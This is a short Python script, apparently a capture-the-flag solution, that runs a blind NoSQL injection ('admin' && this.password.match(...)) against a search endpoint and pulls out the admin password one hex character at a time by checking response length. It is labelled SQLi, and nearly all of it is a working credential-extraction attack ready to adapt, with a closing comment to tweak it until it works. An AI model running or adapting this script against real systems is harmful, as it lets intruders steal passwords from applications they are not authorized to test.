#PYTHON SQLI
#ENUMERATE HEXADESIMAL CODES
import requests
endpoint = "/?search=admin'%20%26%26%20this.password.match"
host = "" #ENTER HOSTNAME HERE
base = host+endpoint
charset=["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","-"]
key = ""
def find_next_hex_dig(prev_hex):
	for x in charset:
		url = base + "(/^" + prev_hex + x + ".*$/)%00"
		request = requests.get(url)
		request.raw
		if (len(request.text) != 1555):
			print(prev_hex + x)
			confUrl = base + "(/^" + prev_hex + x + "$/)%00"
			confRequest = requests.get(confUrl)
			if (len(confRequest.text) != 1555): return True
			else: return x 
while True:
	response = find_next_hex_dig(key)
	if response == True: break
	else: key += response
#MODIFY AND TWEAKE UNTILL IT WORKS 
